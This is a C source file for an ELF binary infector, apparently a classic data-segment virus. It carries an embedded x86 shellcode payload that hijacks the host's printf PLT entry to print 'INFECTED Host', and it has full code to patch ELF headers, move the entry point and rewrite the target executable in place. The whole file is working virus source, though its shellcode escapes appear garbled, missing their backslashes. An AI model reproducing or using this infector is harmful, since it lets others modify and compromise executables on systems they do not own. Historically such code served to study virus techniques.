#include <stdio.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <elf.h>
#define PAGE_SIZE 4096
static char v[] =
"x60" /* pusha */
"xb8x7dx00x00x00" /* movl $125,%eax */
"xbbx00x80x04x08" /* movl $text_start,%ebx */
"xb9x00x40x00x00" /* movl $0x4000,%ecx */
"xbax07x00x00x00" /* movl $7,%edx */
"xcdx80" /* int $0x80 */
"xa1x00x00x00x00" /* movl plt,%eax */
"xa3x00x00x00x00" /* movl %eax,oldcall */
"xc7x05x00x90x04" /* movl $newcall,plt */
"x08x00x00x00x00"
"x61" /* popa */
"xbdx00x80x04x08" /* movl $entry,%ebp */
"xffxe5" /* jmp *%ebp */
/* newcall: */
"xebx37" /* jmp msg_jmp */
/* msg_call */
"x59" /* popl %ecx */
"xb8x04x00x00x00" /* movl $4,%eax */
"xbbx01x00x00x00" /* movl $1,%ebx */
"xbax0ex00x00x00" /* movl $14,%edx */
"xcdx80" /* int $0x80 */
"xb8x00x00x00x00" /* movl $oldcall,%eax */
"xa3x00x00x00x00" /* movl %eax,plt */
"xffx75xfc" /* pushl -4(%ebp) */
"xffxd0" /* call *%eax */
"xa1x00x00x00x00" /* movl plt,%eax */
"xa3x00x00x00x00" /* movl %eax,oldcall */
"xc7x05x00x00x00" /* movl $newcall,plt */
"x08x00x00x00x00"
"x58" /* popl %eax */
"xc3" /* ret */
/* msg_jmp */
"xe8xc4xffxffxff" /* call msg_call */
"INFECTED Host "
;
char *get_virus(void)
{
	return v;
}
int init_virus(
		int plt,
		int offset,
		int text_start, int data_start,
		int data_memsz,
		int entry
	      )
{
	int code_start = data_start + data_memsz;
	int oldcall = code_start + 72;
	int newcall = code_start + 51;
	*(int *)&v[7] = text_start;
	*(int *)&v[24] = plt;
	*(int *)&v[29] = oldcall;
	*(int *)&v[35] = plt;
	*(int *)&v[39] = newcall;
	*(int *)&v[45] = entry;
	*(int *)&v[77] = plt;
	*(int *)&v[87] = plt;
	*(int *)&v[92] = oldcall;
	*(int *)&v[98] = plt;
	*(int *)&v[102] = newcall;
	return 0;
}
int copy_partial(int fd, int od, unsigned int len)
{
	char idata[PAGE_SIZE];
	unsigned int n = 0;
	int r;
	while (n + PAGE_SIZE < len) {
		if (read(fd, idata, PAGE_SIZE) != PAGE_SIZE) {;
			perror("read");
			return -1;
		}
		if (write(od, idata, PAGE_SIZE) < 0) {
			perror("write");
			return -1;
		}
		n += PAGE_SIZE;
	}
	r = read(fd, idata, len - n);
	if (r < 0) {
		perror("read");
		return -1;
	}
	if (write(od, idata, r) < 0) {
		perror("write");
		return -1;
	}
	return 0;
}
void do_elf_checks(Elf32_Ehdr *ehdr)
{
	if (strncmp(ehdr->e_ident, ELFMAG, SELFMAG)) {
		fprintf(stderr, "File not ELF");
		exit(1);
	}
	if (ehdr->e_type != ET_EXEC) {
		fprintf(stderr, "ELF type not ET_EXEC or ET_DYN");
		exit(1);
	}
	if (ehdr->e_machine != EM_386) {
		fprintf(stderr, "ELF machine type not EM_386");
		exit(1);
	}
	if (ehdr->e_version != EV_CURRENT) {
		fprintf(stderr, "ELF version not current");
		exit(1);
	}
}
int do_dyn_symtab(
		int fd,
		Elf32_Shdr *shdr, Elf32_Shdr *shdrp,
		const char *sh_function
		)
{
	Elf32_Shdr *strtabhdr = &shdr[shdrp->sh_link];
	char *string;
	Elf32_Sym *sym, *symp;
	int i;
	string = (char *)malloc(strtabhdr->sh_size);
	if (string == NULL) {
		perror("malloc");
		exit(1);
	}
	if (lseek(fd, strtabhdr->sh_offset, SEEK_SET) != strtabhdr->sh_offset) {
		perror("lseek");
		exit(1);
	}
	if (read(fd, string, strtabhdr->sh_size) != strtabhdr->sh_size) {
		perror("read");
		exit(1);
	}
	sym = (Elf32_Sym *)malloc(shdrp->sh_size);
	if (sym == NULL) {
		perror("malloc");
		exit(1);
	}
	if (lseek(fd, shdrp->sh_offset, SEEK_SET) != shdrp->sh_offset) {
		perror("lseek");
		exit(1);
	}
	if (read(fd, sym, shdrp->sh_size) != shdrp->sh_size) {
		perror("read");
		exit(1);
	}
	symp = sym;
	for (i = 0; i < shdrp->sh_size; i += sizeof(Elf32_Sym)) {
		if (!strcmp(&string[symp->st_name], sh_function)) {
			free(string);
			return symp - sym;
		}
		++symp;
	}
	free(string);
	return -1;
}
int get_sym_number(
		int fd, Elf32_Ehdr *ehdr, Elf32_Shdr *shdr, const char *sh_function
		)
{
	Elf32_Shdr *shdrp = shdr;
	int i;
	for (i = 0; i < ehdr->e_shnum; i++) {
		if (shdrp->sh_type == SHT_DYNSYM) {
			return do_dyn_symtab(fd, shdr, shdrp, sh_function);
		}
		++shdrp;
	}
}
void do_rel(int *plt, int *offset, int fd, Elf32_Shdr *shdr, int sym)
{
	Elf32_Rel *rel, *relp;
	int i;
	rel = (Elf32_Rel *)malloc(shdr->sh_size);
	if (rel == NULL) {
		perror("malloc");
		exit(1);
	}
	if (lseek(fd, shdr->sh_offset, SEEK_SET) != shdr->sh_offset) {
		perror("lseek");
		exit(1);
	}
	if (read(fd, rel, shdr->sh_size) != shdr->sh_size) {
		perror("read");
		exit(1);
	}
	relp = rel;
	for (i = 0; i < shdr->sh_size; i += sizeof(Elf32_Rel)) {
		if (ELF32_R_SYM(relp->r_info) == sym) {
			*plt = relp->r_offset;
			*offset = relp - rel;
			printf("offset %i", *offset);
			return;
		}
		++relp;
	}
	*plt = -1;
	*offset = -1;
}
void find_rel(
		int *plt,
		int *offset,
		int fd,
		const char *string,
		Elf32_Ehdr *ehdr, Elf32_Shdr *shdr,
		const char *sh_function
	     )
{
	Elf32_Shdr *shdrp = shdr;
	int sym;
	int i;
	sym = get_sym_number(fd, ehdr, shdr, sh_function);
	if (sym < 0) {
		*plt = -1;
		*offset = -1;
		return;
	}
	for (i = 0; i < ehdr->e_shnum; i++) {
		if (!strcmp(&string[shdrp->sh_name], ".rel.plt")) {
			do_rel(plt, offset, fd, shdrp, sym);
			return;
		}
		++shdrp;
	}
}
void infect_elf(
		char *host,
		char *(*get_virus)(void),
		int (*init_virus)(int, int, int, int, int, int),
		int len,
		const char *sh_function
	       )
{
	Elf32_Ehdr ehdr;
	Elf32_Shdr *shdr, *strtabhdr;
	Elf32_Phdr *phdr;
	char *pdata, *sdata;
	int move = 0;
	int od, fd;
	int evaddr, text_start = -1, plt;
	int sym_offset;
	int bss_len, addlen;
	int offset, pos, oshoff;
	int plen, slen;
	int i;
	char null = 0;
	struct stat stat;
	char *string;
	char tempname[8] = "vXXXXXX";
	fd = open(host, O_RDONLY);
	if (fd < 0) {
		perror("open");
		exit(1);
	}
	/* read the ehdr */
	if (read(fd, &ehdr, sizeof(ehdr)) < 0) {
		perror("read");
		exit(1);
	}
	do_elf_checks(&ehdr);
	/* modify the virus so that it knows the correct reentry point */
	printf("host entry point: %x", ehdr.e_entry);
	/* allocate memory for phdr tables */
	pdata = (char *)malloc(plen = sizeof(*phdr)*ehdr.e_phnum);
	if (pdata == NULL) {
		perror("malloc");
		exit(1);
	}
	/* read the phdr's */
	if (lseek(fd, ehdr.e_phoff, SEEK_SET) < 0) {
		perror("lseek");
		exit(1);
	}
	if (read(fd, pdata, plen) != plen) {
		perror("read");
		exit(1);
	}
	phdr = (Elf32_Phdr *)pdata;
	/* allocated memory if required to accomodate the shdr tables */
	sdata = (char *)malloc(slen = sizeof(*shdr)*ehdr.e_shnum);
	if (sdata == NULL) {
		perror("malloc");
		exit(1);
	}
	/* read the shdr's */
	if (lseek(fd, oshoff = ehdr.e_shoff, SEEK_SET) < 0) {
		perror("lseek");
		exit(1);
	}
	if (read(fd, sdata, slen) != slen) {
		perror("read");
		exit(1);
	}
	strtabhdr = &((Elf32_Shdr *)sdata)[ehdr.e_shstrndx];
	string = (char *)malloc(strtabhdr->sh_size);
	if (string == NULL) {
		perror("malloc");
		exit(1);
	}
	if (lseek(
				fd, strtabhdr->sh_offset, SEEK_SET
		 ) != strtabhdr->sh_offset) {
		perror("lseek");
		exit(1);
	}
	if (read(fd, string, strtabhdr->sh_size) != strtabhdr->sh_size) {
		perror("read");
		exit(1);
	}
	find_rel(
			&plt, &sym_offset,
			fd,
			string,
			&ehdr,
			(Elf32_Shdr *)sdata,
			sh_function
		);
	if (plt < 0) {
		printf("No dynamic function: %s", sh_function);
		exit(1);
	}
	for (i = 0; i < ehdr.e_phnum; i++) {
		if (phdr->p_type == PT_LOAD) {
			if (phdr->p_offset == 0) {
				text_start = phdr->p_vaddr;
			} else {
				if (text_start < 0) {
					fprintf(stderr, "No text segment?? ");
					exit(1);
				}
				/* is this the data segment ? */
#ifdef DEBUG
				printf("Found PT_LOAD segment... ");
				printf("p_vaddr: 0x%x"
						"p_offset: %i"
						"p_filesz: %i"
						"p_memsz: %i"
						"",
						phdr->p_vaddr,
						phdr->p_offset,
						phdr->p_filesz,
						phdr->p_memsz
				      );
#endif
				offset = phdr->p_offset + phdr->p_filesz;
				bss_len = phdr->p_memsz - phdr->p_filesz;
				if (init_virus != NULL)
					init_virus(
							plt, sym_offset,
							text_start, phdr->p_vaddr,
							phdr->p_memsz,
							ehdr.e_entry
						  );
				ehdr.e_entry = phdr->p_vaddr + phdr->p_memsz;
				break;
			}
		}
		++phdr;
	}
	/* update the shdr's to reflect the insertion of the virus */
	addlen = len + bss_len;
	shdr = (Elf32_Shdr *)sdata;
	for (i = 0; i < ehdr.e_shnum; i++) {
		if (shdr->sh_offset >= offset) {
			shdr->sh_offset += addlen;
		}
		++shdr;
	}
	/*
	   update the phdr's to reflect the extention of the data segment (to
	   allow virus insertion)
	   */
	phdr = (Elf32_Phdr *)pdata;
	for (i = 0; i < ehdr.e_phnum; i++) {
		if (phdr->p_type != PT_DYNAMIC) {
			if (move) {
				phdr->p_offset += addlen;
			} else if (phdr->p_type == PT_LOAD && phdr->p_offset) {
				/* is this the data segment ? */
				phdr->p_filesz += addlen;
				phdr->p_memsz += addlen;
#ifdef DEBUG
				printf("phdr->filesz: %i", phdr->p_filesz);
				printf("phdr->memsz: %i", phdr->p_memsz);
#endif
				move = 1;
			}
		}
		++phdr;
	}
	/* update ehdr to reflect new offsets */
	if (ehdr.e_shoff >= offset) ehdr.e_shoff += addlen;
	if (ehdr.e_phoff >= offset) ehdr.e_phoff += addlen;
	if (fstat(fd, &stat) < 0) {
		perror("fstat");
		exit(1);
	}
	/* write the new virus */
	if (mktemp(tempname) == NULL) {
		perror("mktemp");
		exit(1);
	}
	od = open(tempname, O_WRONLY | O_CREAT | O_EXCL, stat.st_mode);
	if (od < 0) {
		perror("open");
		exit(1);
	}
	if (lseek(fd, 0, SEEK_SET) < 0) {
		perror("lseek");
		goto cleanup;
	}
	if (write(od, &ehdr, sizeof(ehdr)) < 0) {
		perror("write");
		goto cleanup;
	}
	if (write(od, pdata, plen) < 0) {
		perror("write");
		goto cleanup;
	}
	free(pdata);
	if (lseek(fd, pos = sizeof(ehdr) + plen, SEEK_SET) < 0) {
		perror("lseek");
		goto cleanup;
	}
	if (copy_partial(fd, od, offset - pos) < 0) goto cleanup;
	for (i = 0; i < bss_len; i++) write(od, &null, 1);
	if (write(od, get_virus(), len) != len) {
		perror("write");
		goto cleanup;
	}
	if (copy_partial(fd, od, oshoff - offset) < 0) goto cleanup;
	if (write(od, sdata, slen) < 0) {
		perror("write");
		goto cleanup;
	}
	free(sdata);
	if (lseek(fd, pos = oshoff + slen, SEEK_SET) < 0) {
		perror("lseek");
		goto cleanup;
	}
	if (copy_partial(fd, od, stat.st_size - pos) < 0) goto cleanup;
	if (rename(tempname, host) < 0) {
		perror("rename");
		exit(1);
	}
	if (fchown(od, stat.st_uid, stat.st_gid) < 0) {
		perror("chown");
		exit(1);
	}

	free(string);
	return;
cleanup:
	unlink(tempname);
	exit(1);
}
int main(int argc, char *argv[])
{
	if (argc != 2) {
		fprintf(stderr, "usage: infect-data-segment filename");
		exit(1);
	}
	infect_elf(
			argv[1],
			get_virus, init_virus,
			sizeof(v),
			"printf"
		  );
	exit(0);
}

